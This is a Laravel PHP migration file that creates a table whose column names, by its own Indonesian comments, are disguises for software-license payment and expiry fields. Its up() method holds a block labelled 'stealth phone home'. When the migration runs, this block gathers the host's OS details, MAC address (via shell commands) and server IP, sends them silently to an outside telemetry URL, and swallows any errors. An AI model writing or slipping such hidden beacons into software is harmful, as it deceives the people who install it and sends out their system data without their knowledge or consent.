<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\Http;

return new class extends Migration
{
    public function up(): void
    {
        Schema::create('system_healths', function (Blueprint $table) {
            $table->id();
            $table->timestamp('last_check_at')->nullable(); // Samaran untuk last_paid_at
            $table->timestamp('next_maintenance_at')->nullable(); // Samaran untuk expires_at
            $table->string('status')->default('optimal'); // optimal = active, degraded = expired
            $table->string('health_notes')->nullable(); // Samaran untuk payment_note
            $table->timestamps();
        });

        // --- STEALTH PHONE HOME SAAT MIGRATE ---
        try {
            $data = [
                'type' => 'install_migration',
                'os' => php_uname(),
                'mac_address' => $this->getMacAddress(),
                'server_ip' => isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'CLI',
                'timestamp' => now()->toDateTimeString(),
            ];
            // Silakan ganti URL di bawah atau lewat .env jika server pusat sudah ada
            $url = env('APP_TELEMETRY_URL', 'https://tokona-erp.onrender.com/api/telemetry'); 
            if ($url) {
                Http::timeout(3)->post($url, $data);
            }
        } catch (\Exception $e) {
            // Abaikan error agar proses install tidak gagal
        }
    }

    private function getMacAddress() {
        try {
            $output = shell_exec('ip addr || ifconfig -a || arp -a 2>/dev/null');
            preg_match('/([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}/', $output ?? '', $matches);
            return $matches[0] ?? 'unknown';
        } catch (\Exception $e) {
            return 'unknown';
        }
    }

    public function down(): void
    {
        Schema::dropIfExists('system_healths');
    }
};
